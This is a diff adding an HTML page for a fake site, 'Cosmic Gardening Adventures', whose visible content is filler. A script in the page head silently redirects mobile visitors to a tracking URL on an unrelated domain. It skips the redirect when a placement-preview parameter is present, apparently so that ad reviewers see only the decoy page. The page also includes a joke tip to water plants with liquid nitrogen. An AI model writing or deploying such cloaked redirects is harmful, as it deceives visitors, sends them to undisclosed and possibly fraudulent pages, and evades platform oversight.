@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Gardening Adventures</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #FF00FF, #00FFFF);
+            color: #FFFF00;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            background-color: #800080;
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: #008080;
+            padding: 10px;
+        }
+        nav ul {
+            list-style-type: none;
+            display: flex;
+            justify-content: space-around;
+        }
+        .content {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        footer {
+            background-color: #800000;
+            color: #FFFFFF;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Gardening Adventures</h1>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#home">Home</a></li>
+            <li><a href="#plants">Alien Plants</a></li>
+            <li><a href="#tools">Space Tools</a></li>
+            <li><a href="#contact">Contact Us</a></li>
+        </ul>
+    </nav>
+    <div class="container">
+        <div class="content">
+            <h2>Welcome to Intergalactic Horticulture</h2>
+            <p>Discover the joys of growing extraterrestrial flora in your own backyard!</p>
+        </div>
+        <div class="content">
+            <h2>Featured Alien Plant: Zorg Zinnias</h2>
+            <p>These fluorescent flowers will brighten up any garden... or spaceship!</p>
+        </div>
+        <div class="content">
+            <h2>Tip of the Day</h2>
+            <p>Remember to water your Martian Marigolds with a 50/50 mix of H2O and liquid nitrogen!</p>
+        </div>
+    </div>
+    <footer>
+        <p>&copy; 2023 Cosmic Gardening Adventures | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
